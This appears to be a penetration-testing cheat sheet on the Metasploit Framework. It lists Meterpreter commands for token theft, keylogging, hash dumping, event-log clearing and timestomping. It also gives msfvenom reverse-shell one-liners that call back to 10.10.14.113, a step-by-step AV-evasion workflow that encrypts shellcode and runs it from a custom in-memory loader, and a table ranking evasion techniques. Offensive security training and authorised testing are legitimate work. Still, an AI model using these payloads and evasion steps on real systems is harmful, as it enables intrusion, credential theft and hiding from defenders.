+++
title = 'Metasploit Framework'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['utilities', 'payloads', 'metasploit']
+++

The Metasploit Framework is a Ruby-based penetration testing platform for writing, testing, and executing exploit code. It contains a suite of tools to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.

> **2025–2026 context:** Metasploit 6.5 (July 2026) is the most significant release in years. It adds **Malleable C2 profiles across all Meterpreter runtimes**, an **MCP server for AI-assisted interaction**, **expanded NTLM relay modules** (HTTP-to-SMB, HTTP-to-LDAP, NTLMRelay2Self), **fileless Linux execution via `memfd_create`**, and **MITRE ATT&CK module tagging** . The persistence system was completely overhauled starting July 2025, with standardization across platforms and many new Windows techniques .

---

## 1. MSFconsole Commands

| Command | Description |
|---|---|
| `show exploits` | Show all exploits within the Framework |
| `show payloads` | Show all payloads within the Framework |
| `setg` | Set a specific value globally (e.g. LHOST or RHOST) |
| `show options` | Show the options available for a module or exploit |
| `show targets` | Show the platforms supported by the exploit |
| `set target` | Specify a target index if you know the OS and service pack |
| `set payload` | Specify the payload to use |
| `show advanced` | Show advanced options |
| `sessions -l` | List available sessions |
| `sessions -i` | Interact with a session |
| `sessions -K` | Kill all live sessions |
| `sessions -c` | Execute a command on all live Meterpreter sessions |
| `sessions -u` | Upgrade a normal Win32 shell to a Meterpreter console |

---

## 2. Meterpreter Commands

| Command | Description |
|---|---|
| `migrate <PID>` | Migrate to the specified process ID (from `ps`) |
| `list_tokens -u` | List available tokens by user |
| `list_tokens -g` | List available tokens by group |
| `impersonate_token <DOMAIN\USER>` | Impersonate an available token |
| `steal_token <PID>` | Steal and impersonate a process token |
| `drop_token` | Stop impersonating the current token |
| `getsystem` | Attempt SYSTEM-level access through multiple vectors |
| `shell` | Drop into an interactive shell |
| `execute -f cmd.exe -i` | Execute cmd.exe and interact |
| `execute -f cmd.exe -i -t` | Execute cmd.exe with all available tokens |
| `execute -f cmd.exe -i -H -t` | Execute cmd.exe with tokens as a hidden process |
| `rev2self` | Revert to the original user |
| `reg` | Interact with the target registry |
| `setdesktop` | Switch to a different logged-in screen |
| `screenshot` | Screenshot the target's screen |
| `upload` / `download` | Transfer files |
| `keyscan_start` / `keyscan_dump` / `keyscan_stop` | Keystroke sniffing |
| `getprivs` | Enable as many privileges as possible |
| `uictl enable keyboard/mouse` | Control keyboard and/or mouse |
| `background` | Background the current session |
| `hashdump` | Dump local hashes (requires SYSTEM) |
| `load sniffer` / `sniffer_interfaces` / `sniffer_start` / `sniffer_dump` / `sniffer_stats` / `sniffer_stop` | Packet capture |
| `add_user -h` | Add a user on the target |
| `add_group_user "Domain Admins" -h` | Add a user to a group |
| `clearev` | Clear the event log |
| `timestomp` | Modify file attributes (antiforensics) |
| `reboot` | Reboot the target |

### 2.1 `getsystem` — the three techniques

`getsystem` attempts three named techniques in order. Understanding them helps when one fails:

| Technique | How it works | When it fails |
|---|---|---|
| **Named Pipe Impersonation (In Memory/Admin)** | Creates a named pipe, spawns a service that connects to it, impersonates the SYSTEM token | Requires `SeImpersonatePrivilege`; modern AV may flag the pipe name |
| **Named Pipe Impersonation (Dropper/Admin)** | Writes a dropper to disk that connects to the pipe | Disk artifact; heavily signatured |
| **Token Duplication (Admin)** | Duplicates the token of a SYSTEM process | Requires `SeDebugPrivilege`; fails if `RunAsPPL` blocks LSASS access |

If `getsystem` fails, check `whoami /priv` and **use a Potato** (GodPotato, SigmaPotato, PrintSpoofer) — the `getsystem` named-pipe technique is the same primitive as a Potato, and modern Potatoes are more reliable against current AV .

---

## 3. Database and Workspace Workflow

Metasploit's database is frequently under-used, but it is what turns msfconsole from a launcher into a **campaign manager**. Every scan, host, service, vulnerability, and credential is stored and queryable.

### 3.1 Initialise and manage

```bash
# Start the database and console
sudo msfdb run

# Verify connectivity
db_status
```

```bash
msf6 > workspace                  # list workspaces
msf6 > workspace -a client_a      # add a workspace
msf6 > workspace -r client_a renamed  # rename
msf6 > workspace -d client_a      # delete
msf6 > workspace client_b         # switch
```

### 3.2 Populate with scans

```bash
# Run nmap and store results directly in the database
msf6 > db_nmap -sV -p- 10.10.10.0/24

# Import existing scan output
msf6 > db_import scan.xml
```

### 3.3 Query the database

```bash
hosts              # list discovered hosts
services           # list services
vulns              # list vulnerabilities
creds              # list credentials
loot               # list collected data
notes              # list notes
```

### 3.4 `db_autopwn` and automation

`db_autopwn` was removed in Metasploit 4.11, but the modern equivalent is the **`db_nmap` + `vulns` + manual module selection** workflow, or the **`autopwn`** auxiliary modules where available. Use `search` against the database:

```bash
msf6 > services -p 445
msf6 > vulns -s
```

> **Why this matters on an exam:** `workspace` separates clients/engagements, `db_nmap` avoids re-scanning, and `creds` / `loot` gives you a persistent record of what you have collected across sessions. It is the difference between a scattered set of terminals and a reproducible engagement.

---

## 4. Common Meterpreter Payloads for Windows

| Payload | Description |
|---|---|
| `generic/custom` | Generic, multi-use listener |
| `generic/shell_bind_tcp` | Generic TCP bind shell |
| `generic/shell_reverse_tcp` | Generic TCP reverse shell |
| `windows/x64/exec` | Execute an arbitrary command (x64) |
| `windows/x64/loadlibrary` | Load an arbitrary x64 library path |
| `windows/x64/messagebox` | MessageBox with customisable title/text/icon |
| `windows/x64/shell_reverse_tcp` | Normal shell, single payload, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Normal shell, stager + stage |
| `windows/x64/shell/bind_ipv6_tcp` | IPv6 Bind TCP stager |
| `windows/x64/meterpreter/$` | Meterpreter + varieties |
| `windows/x64/powershell/$` | Interactive PowerShell + varieties |
| `windows/x64/vncinject/$` | VNC Server (Reflective Injection) + varieties |

> **New in 6.5:** **Windows on ARM (AArch64)** now has first-class reverse-TCP shells, both inline and staged — previously these targets required x86 emulation or a custom payload .

---

## 5. Importing External Exploits

The default module directory is `/usr/share/metasploit-framework`; the user directory is `/home/username/.msf4`.

```bash
# Copy the module into the appropriate folder, then:
msf6 > reload_all

# Or load a module at runtime:
msf6 > loadpath /usr/share/metasploit-framework/modules/
```

---

## 6. Meterpreter Pivoting

| Command | Description |
|---|---|
| `portfwd add -R -l 8443 -p 1234 -L 10.10.14.15` | Reverse port forward — traffic to 10.10.14.15:1234 is forwarded to 8443 on the attack host |
| `run autoroute -s 172.16.9.0/23` | Add a route to the 172.16.9.0/23 subnet through the session |

> **Meterpreter pivoting vs Ligolo-ng:** `autoroute` only works inside Metasploit — other tools cannot use the route. For a real pivot that `nmap`, `curl`, or a browser can use, prefer **Ligolo-ng** or **Chisel** (see the Pivoting notes). Use `autoroute` when you are staying entirely within Metasploit modules.

---

## 7. MSFvenom — Payload Generation

### 7.1 Common one-liners

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe -o shell.exe

# macOS Mach-O
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho -o shell.macho

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp -o shell.asp

# JSP (raw and WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war -o shell.war
```

### 7.2 Output formats and encoders

```bash
# List formats and encoders
msfvenom --list formats
msfvenom --list encoders
```

> **`shikata_ga_nai` is no longer sufficient on its own.** It is one of the most-signatured encoders in existence — Windows Defender and most EDRs detect its output regardless of iteration count . The modern approach is **encryption + a custom loader**, not encoding.

### 7.3 Modern evasion — encryption loader pattern

The reliable 2025–2026 pattern is: **generate raw shellcode → encrypt it → embed it in a custom loader that decrypts in memory** .

**Step 1 — raw shellcode:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.113 LPORT=443 -f raw -o shellcode.bin
```

**Step 2 — encrypt** (AES, XOR, or RC4) with a script:

```python
# encrypt_payload.py — simple AES example
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = os.urandom(32)
iv  = os.urandom(16)

with open("shellcode.bin", "rb") as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(data, AES.block_size))

with open("shellcode.enc", "wb") as f:
    f.write(enc)

print(f"KEY={key.hex()}")
print(f"IV={iv.hex()}")
```

**Step 3 — a C++ loader** that decrypts and executes in memory (`VirtualAlloc` + `CreateThread`), compiled with `mingw-w64` :

```bash
x86_64-w64-mingw32-g++ loader.cpp -o loader.exe -static -s
```

**Step 4 — handler:**

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.10.14.113; set LPORT 443; exploit"
```

> **Why this works:** the on-disk artifact contains **encrypted bytes and a decryption stub**, not the recognizable Meterpreter shellcode. Static signatures do not match, and the payload is only decrypted in memory at runtime. This is the same primitive as a commercial crypter, built from primitives you control .

### 7.4 Polymorphic generation (6.x)

Metasploit replaced the **static** payload-generation routine for the Windows shellcode stager with a **randomization routine that shuffles instructions on each generation**, adding polymorphic properties to the stub . This raises the bar against static signatures but is **not a substitute for encryption** — behavioral detection still catches the Meterpreter runtime.

---

## 8. Metasploit 6.5 — What Changed

### 8.1 Malleable C2 profiles

Malleable C2 profiles let you **change the shape of Meterpreter's HTTP(S) traffic** — the same idea as Cobalt Strike profiles. As of 6.5, this works across **Windows, Java, Python, PHP, and Linux Meterpreters**, using TLV-based configuration blocks, distinct GET and POST URIs, and connection UUID handling in URIs, headers, and GET parameters .

```bash
# Use a profile with a Meterpreter HTTP payload
msf6 > set HttpMalleableProfile /path/to/profile.profile
```

**Why this matters:** a Meterpreter session whose HTTP traffic looks like a normal application is far harder to detect with network signatures than the default `Meterpreter` User-Agent and beacon pattern.

### 8.2 MCP server — AI-assisted interaction

`msfmcpd` is a middleware layer that exposes **8 standardized tools** (16 in the full 6.5 release) for AI assistants to query Metasploit — module search, host/service/vulnerability data, and reconnaissance. **High-risk actions (module execution, session interaction, database modification) are disabled by default** and are on the roadmap for a future release .

**Why this matters:** it turns Metasploit into a **queryable data source for automation** — useful for large engagements where you want an agent to correlate hosts, services, and modules, without granting it execution rights.

### 8.3 Expanded NTLM relaying

6.5 adds **HTTP-to-SMB** and **HTTP-to-LDAP** relay modules, plus **`exploits/windows/local/ntlm_relay_2_self`** — an automated **NTLMRelay2Self** local privilege escalation for domain-joined workstations .

```bash
# HTTP → LDAP relay (opens an authenticated LDAP session as the relayed identity)
msf6 > use auxiliary/server/relay/http_to_ldap
```

### 8.4 Fileless Linux execution — `memfd_create`

Fetch payloads now support **in-memory ELF execution via `memfd_create`**, including **RISC-V** targets, with no disk write . This is the Linux equivalent of `execute -H` on Windows — the payload never touches the filesystem.

### 8.5 MITRE ATT&CK tagging

Modules are now tagged with ATT&CK technique IDs, which improves `search` and threat-emulation workflows .

```bash
msf6 > search att&ck:T1059
```

### 8.6 Persistence overhaul

The persistence system was **completely overhauled starting July 2025**, with standardization across platforms and many new Windows techniques . The old `run persistence` script is deprecated in favor of the new framework; check `show options` on the current persistence modules for the supported techniques.

---

## 9. Useful Modules and Utilities

### 9.1 Exploit suggester and hash dumping

```bash
# Local privilege escalation suggester (run on a backgrounded session)
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
```

```bash
# Dump local hashes (requires SYSTEM)
meterpreter > hashdump

# Dump LSA secrets
meterpreter > lsa_dump_secrets

# Dump SAM
meterpreter > lsa_dump_sam
```

> **Before `hashdump`:** confirm you are SYSTEM. Use `ps` to check process context, then `migrate <PID>` into a SYSTEM process (e.g. `lsass.exe` or `winlogon.exe`) if you are not already.

### 9.2 Notable modules (2025–2026 additions)

| Module | CVE / Purpose |
|---|---|
| `exploit/linux/local/cve_2026_31431_copy_fail` | **Copy Fail** — Linux LPE affecting almost every kernel since 2017; replaces `su` in the page cache  |
| `exploit/linux/local/cve_2026_46300_fragnesia` | **Fragnesia** — Linux kernel LPE  |
| `exploit/multi/http/spip_saisies_rce` | SPIP Saisies unauthenticated RCE (CVE-2025-71243)  |
| `auxiliary/gather/leakix_search` | LeakIX API — exposed services and leaked credentials  |
| `evasion/linux/x64/rc4_packer` | RC4 payload packer with optional `nanosleep` delay  |
| `exploit/linux/http/pterodactyl_locales_locale_json` | Pterodactyl Panel RCE (CVE-2025-49132)  |
| `exploit/linux/http/sonicwall_sma1000_wsproxy_rce` | SonicWall SMA1000 SSRF → RCE (CVE-2026-15409)  |
| `auxiliary/server/relay/http_to_ldap` | HTTP → LDAP NTLM relay  |
| `exploit/windows/local/ntlm_relay_2_self` | Automated NTLMRelay2Self LPE  |

### 9.3 Classic modules still worth knowing

```bash
use exploit/windows/smb/psexec              # SMB + PsExec
use auxiliary/scanner/smb/smb_ms17_010      # MS17-010 check
use exploit/windows/smb/ms17_010_psexec     # MS17-010
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce  # rConfig 3.9.6
```

---

## 10. Evasion — What Actually Works in 2026

| Approach | Effectiveness | Notes |
|---|---|---|
| **Raw `msfvenom` output** | **Very low** | Detected by every major AV; use only on a lab with no AV  |
| **`shikata_ga_nai` (any iteration count)** | **Very low** | One of the most-signatured encoders; AV detects it regardless of encoding layers  |
| **Encryption + custom loader** | **High** | The on-disk artifact is encrypted; decryption happens in memory  |
| **Polymorphic stub (6.x)** | **Medium** | Raises the bar against static signatures but not behavioural detection  |
| **Malleable C2 profile** | **High (network layer)** | Defeats network signatures on Meterpreter HTTP(S) traffic  |
| **Fileless (`memfd_create`, fetch payloads)** | **High** | No disk artifact on Linux  |
| **PowerShell download cradle** | **Medium** | Bypasses disk detection but AMSI inspects the script  |

> **The 2026 reality:** static encoding is dead. **Encryption + a custom loader** is the baseline; **Malleable C2** covers the network layer; **fileless fetch** covers Linux. If the target has EDR rather than AV, none of the on-disk approaches are reliable — pivot to living-off-the-land (see the LOLBAS notes).

---

## 11. Field Notes

- **6.5 is the version to know.** Malleable C2, MCP, expanded NTLM relay, and fileless Linux fetch are the features that change how you use Metasploit in 2026 .
- **`getsystem` is a Potato, not a magic button.** If it fails, check `whoami /priv` and use GodPotato or SigmaPotato — the named-pipe technique has the same preconditions.
- **`autoroute` only works inside Metasploit.** For a pivot that other tools can use, prefer Ligolo-ng.
- **`hashdump` requires SYSTEM.** Migrate into `lsass.exe` or `winlogon.exe` first if `getsystem` did not already put you there.
- **`shikata_ga_nai` is a signature, not an evasion.** Use encryption + a loader, not more encoding iterations.
- **The database is the campaign manager.** `workspace` + `db_nmap` + `creds` + `loot` is what makes an engagement reproducible.
- **The persistence framework was rebuilt.** The old `run persistence` script is deprecated — check the current modules for the supported techniques .
- **MCP is read-only by default.** High-risk actions are disabled; it is a data source for automation, not an execution engine .

---

This file sits alongside the **Shells and Payloads**, **Pivoting**, and **LOLBAS** notes: Metasploit is the orchestration layer, but the payloads it generates are the same primitives — and the evasion guidance here applies whether you use `msfvenom` or a hand-written loader.
